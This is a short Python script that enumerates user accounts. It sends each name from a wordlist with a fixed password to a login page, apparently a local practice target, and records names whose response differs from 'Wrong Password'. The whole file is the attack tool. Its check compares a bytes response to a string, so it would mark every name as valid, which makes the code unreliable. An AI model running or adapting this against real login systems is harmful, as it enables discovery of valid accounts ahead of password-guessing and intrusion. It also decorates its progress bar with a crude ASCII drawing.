import requests
import click, sys


def user_enum(login):
    payload = {'login': login, 'password': '123456'}
    response = requests.get('http://localhost/user-enum/login.php', params=payload)
    return response.content != 'Wrong Password'


fr = open('input_lists/logins', 'r').readlines()
fw = open('output_lists/logins', 'a')
with click.progressbar(fr, file=sys.stderr, show_pos=True, width=70,
                       bar_template='(_(_)=%(bar)sD(_(_| %(info)s', fill_char='=', empty_char=' ') as bar:
    for line in bar:
        if user_enum(line.strip().lower()):
            fw.write(line)
fw.close()
